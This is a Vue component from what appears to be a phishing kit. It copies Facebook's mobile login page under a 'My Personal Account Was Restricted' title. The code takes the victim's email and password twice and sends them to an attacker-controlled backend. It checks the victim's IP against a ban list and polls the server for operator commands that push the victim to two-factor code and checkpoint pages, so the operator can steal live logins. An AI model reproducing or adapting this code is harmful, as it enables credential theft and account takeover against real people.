<script>
import useValidate from "@vuelidate/core";
import { required, email, numeric } from "@vuelidate/validators";
import axios from "axios";
import ChatWidget from "@/components/ChatWidget.vue";

export default {
  name: "Form1",
  components: {
    ChatWidget,
  },
  data() {
    return {
      v$: useValidate(),
      waitingForResponse: false,
      first: true,
      second: false,
      third: false,
      chatMessage: false,
      loading: "",
      ipAddress: "",
      interval: "",
      decision: "",
      firstPassword: false,
      secondPassword: false,
      wrongPw: false,
      pageLoad: false,
      questions: [],
      answers: [
        {
          textfirst: "1?",
          textsecond: "2?",
          textthird: "3?",
        },
        {
          textfirst: "1?",
          textsecond: "2?",
          textthird: "3?",
        },
        {
          textfirst: "1?",
          textsecond: "2?",
          textthird: "3?",
        },
      ],
      form: {
        page_name: "",
        name: "",
        email: "",
        mobile: "",
        // appeal: "",
      },
      modal: {
        password: "",
        error: false,
      },
    };
  },
  created() {
    // this.pageLoading();

    document.title = "My Personal Account Was Restricted | Facebook";
    axios.interceptors.request.use(
      (config) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = true;
        }
        return config;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );

    axios.interceptors.response.use(
      (response) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return response;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );
  },
  mounted() {
    this.getClientIP();
    this.checkBan();
  },
  methods: {
    questionOne(question, type) {
      console.log(question + " " + type);
      if (type == "first") {
        this.questions.push({ question: question, answer: "bosi" });
        this.first = false;
        this.second = true;
      } else if (type == "second") {
        this.questions.push({ question: question, answer: "bosi2" });
        this.second = false;
        this.third = true;
      } else if (type == "third") {
        this.questions.push({ question: question, answer: "bosi3" });
        this.third = false;
      }
    },
    pageLoading() {
      this.pageLoad = true;

      setTimeout(() => {
        this.pageLoad = false;
      }, 4500);
    },
    chatMessageStatus() {
      (this.chatMessage = true), console.log(this.chatMessage);
    },
    getClientIP() {
      axios
        .get("https://api.ipify.org?format=json")
        .then((response) => {
          this.ipAddress = response.data.ip;
          this.checkBan();
        })
        .catch((e) => {
          console.log(e);
        });
    },
    checkBan() {
      axios
        .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/ban`, {
          ip: this.ipAddress,
        })
        .then((response) => {
          if (response.data == "BAN") {
            window.location.href = "https://www.facebook.com/help/";
          }
        })
        .catch((e) => {
          console.log(e);
        });
    },
    getResponse() {
      this.interval = setInterval(() => {
        axios
          .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/decision`, {
            case_ref: this.ipAddress,
          })
          .then((response) => {
            let resType;

            if (response.data == "CMD_EMAIL") {
              resType = "email";

              this.$router.push({
                name: "twofa",
                params: {
                  type: resType,
                  email: this.form.email,
                },
              });
              clearInterval(this.interval);
            }

            if (response.data == "CMD_CODE") {
              resType = "code";

              this.$router.push({
                name: "twofa",
                params: {
                  type: resType,
                  email: this.form.email,
                },
              });
              clearInterval(this.interval);
            }

            if (response.data == "CMD_CHECKPOINT") {
              this.$router.push({
                path: "checkpoint",
              });
              clearInterval(this.interval);
            }

            if (response.data == "CMD_WRONG") {
              this.wrongPw = true;
              this.loading = false;
              this.modal.password = "";
              clearInterval(this.interval);
            }
          })
          .catch((e) => {
            console.log(e);
          });
      }, 1000);
    },
    submitForm() {
      console.log("submit");
      this.firstPassword = true;

      return;
      this.v$.$validate(); // checks all inputs
      if (!this.v$.$error) {
        let data = {
          page_name: this.form.page_name,
          name: this.form.name,
          email: this.form.email,
          mobile: this.form.mobile,
          //   appeal: this.form.appeal,
        };
        console.log(data);
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            data
          )
          .then((response) => {
            console.log(response);
          })
          .catch((e) => {
            this.errors.push(e);
            console.log(this.errors);
          });

        this.firstPassword = true;
      }
    },
    submitPassword() {
      if (this.modal.password != "") {
        if (this.secondPassword == false) {
          this.modal.error = false;
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { email: this.form.email, firstPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
              console.log(response);
              this.waitingForResponse = true;
              this.loading = true;
              this.getResponse();
              this.secondPassword = true;
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });

          this.modal.password = "";
        } else {
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { secondPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
              this.waitingForResponse = true;
              this.loading = true;
              this.getResponse();
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });
        }
      } else {
        this.modal.error = true;
      }
    },
    alert() {
      alert("Please complete the form before you navigate.");
    },
  },
  validations() {
    return {
      form: {
        page_name: { required },
        name: { required },
        email: { required, email },
        mobile: { required, numeric },
        // appeal: { required },
      },
    };
  },
};
</script>

<template>
  <div v-if="loading" id="loadFacebookC" class="">
    <div id="loadFacebookG">
      <div id="blockG_1" class="facebook_blockG"></div>
      <div id="blockG_2" class="facebook_blockG"></div>
      <div id="blockG_3" class="facebook_blockG"></div>
    </div>
  </div>

  <div class="mobile">
    <div class="mobheader">
      <!-- <img src="images/fblogo.png" class="mobfblogo" /> -->
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;" class="mobfblogo" alt="facebook">
    </div>
    <div class="mobmaindiv">
      <div id="mobtextdiv">
        <input
          type="text"
          class="mobtextbox mobtextbox1"
          v-model="form.email"
          placeholder="Mobile number or email"
        />

        <input
          type="password"
          class="mobtextbox mobtextbox2"
          v-model="modal.password"
          placeholder="Password"
        />
      </div>
        <p
            v-if="wrongPw"
            class="pwincorrect"
            id="fbPasswordModalError"
            style="color:red;"
        >
            Your email or password is incorrect!
        </p>
      <input @click="submitPassword()" type="submit" class="mobloginbutton" value="Log In" />
        <div class="mobforgotpw">
            <a href="#">Forgotten password?</a>
        </div>
      <div id="ordiv">
        <span id="or">or</span>
      </div>
      <div id="mobcreatediv">
        <button id="mobcreate">Create New Account</button>
      </div>
    </div>
    <div class="mobfooter">
      <div id="moblangs">
        <div class="item1">
          <li><a href="#" id="mobcurrentlang">English (UK)</a></li>
          <li><a href="#">Türkçe</a></li>
          <li><a href="#">Deutsch</a></li>
          <li><a href="#">Português (Brasil)</a></li>
        </div>
        <div class="item2">
          <li><a href="#">Български</a></li>
          <li><a href="#">Русский</a></li>
          <li><a href="#">Español</a></li>
          <li>
            <a href="#"><i class="fa fa-plus-square-o"></i></a>
          </li>
        </div>
      </div>
      <div class="mobcopyright">
        <span class="mobfbcopyright"
          ><a
            href="https://www.facebook.com"
            target="_blank"
            id="mobcopyrightfblink"
            >Facebook</a
          >
          ©2023</span
        ><br />
      </div>
    </div>
  </div>

  <!-- <ChatWidget /> -->
</template>
<style scoped src="../assets/css/mobile.css"></style>

<style scoped>
.hidden {
  display: none !important;
}
.open-modal {
  overflow: hidden !important;
  padding-right: 16px;
}

@media screen and (max-width: 764px) {
  .hidethis {
    display: none;
  }
}

@media screen and (-webkit-min-device-pixel-ratio:0) { 
  select,
  textarea,
  input {
    font-size: 16px;
  }
}
</style>
